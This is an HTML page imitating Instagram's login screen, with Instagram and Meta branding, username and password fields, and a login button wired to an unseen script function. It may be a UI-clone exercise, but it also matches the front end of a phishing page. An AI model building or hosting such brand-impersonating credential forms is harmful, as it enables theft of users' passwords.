<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="language">English (India)</div>
        <img src="insta_logo.png" alt="Instagram Logo" class="logo">
        <div class="input-group">
            <input id="username" type="text" placeholder="Username, email address or mobile number">
        </div>
        <div class="input-group">
            <input id="password" type="password" placeholder="Password">
        </div>
        <button onclick="sendNotification()" class="login-btn">Log in</button>
        <a href="#" class="forgot-password">Forgotten Password?</a>
        <div class="create">
          <a href="#" class="create-account">Create new account</a>
        </div>
        <div class="meta-logo"><i class="fa-brands fa-meta"></i> Meta</div>
    </div>
  <script src="main.js"></script>
</body>
</html>
